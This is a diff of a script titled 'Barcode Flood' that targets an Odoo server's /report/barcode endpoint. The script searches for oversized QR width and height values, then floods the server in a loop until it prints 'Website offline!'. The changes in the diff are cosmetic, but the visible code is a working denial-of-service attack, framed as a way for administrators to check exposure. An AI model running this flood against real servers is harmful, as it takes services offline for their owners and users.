@@ -1,4 +1,4 @@
-// min-v 11.3.0; group none
+// min-v 11.5.0; group none
 // Barcode Flood
 // What is shown here was reported to Odoo (but ignored as it was not considered important).
 // You can use this script to determine if any action is required on your server to mitigate the problem.
@@ -6,7 +6,7 @@
 $odoo_ver = (version)
 print "Determining vulnerable location..."
 $vuln_location = ''
-for ($i = 20000; $i > 0; $i = $i - 100) {
+for ($i = 20000; $i > 0; $i -= 100) {
     $full_vuln_location = ''
     if ($odoo_ver[0] < 16) {
         $full_vuln_location = '/report/barcode/?type=QR&value=DoSed&width=' + $i + '&height=' + $i
@@ -41,5 +41,5 @@ for (;1;) {
         print "Website offline!"
         break
     }
-    $count = $count + 1
+    $count += 1
 }
